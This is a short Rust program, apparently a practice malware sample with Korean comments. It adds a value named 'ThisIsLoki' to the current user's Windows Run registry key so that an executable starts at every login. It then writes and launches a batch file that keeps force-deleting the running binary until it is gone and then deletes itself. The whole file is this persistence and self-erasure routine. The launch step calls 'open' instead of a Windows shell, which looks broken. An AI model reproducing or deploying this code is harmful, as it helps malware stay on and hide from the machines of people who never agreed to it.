use std::io;
use std::path::Path;
use winreg::RegKey;
use winreg::enums::*;
use std::fs::File;
use std::io::Write;
use std::process::Command;

fn add_registry_value() -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion").join("Run");
    let (_key, _disp) = hkcu.create_subkey(&path)?;

    _key.set_value("ThisIsLoki", &"C:\\Users\\brady\\VScode\\rust\\LokiLoki.exe")?;

    Ok(())
}

fn kill() -> io::Result<()> {
    // batch 파일명
    let killer = "killfile.bat";
    // 실행 파일명
    let this_file = "C:\\Users\\brady\\VScode\\rust\\malware_run\\target\\debug\\malware_run.exe";
    let sz_bat_file = format!(
        ":Repeat      \r\n\
         del /f /s /q {}    \r\n\
         if exist \"{}\" goto Repeat \r\n\
         del /s /q {}     \r\n",
        this_file, this_file, killer
    );

    // batch 파일을 생성합니다.
    let mut fp = File::create(killer)?;
    fp.write_all(sz_bat_file.as_bytes())?;

    let _status = Command::new("open")
        .args(&[killer])
        .status();

    Ok(())
}

fn main() -> io::Result<()> {
    add_registry_value()?;
    kill()?;

    Ok(())
}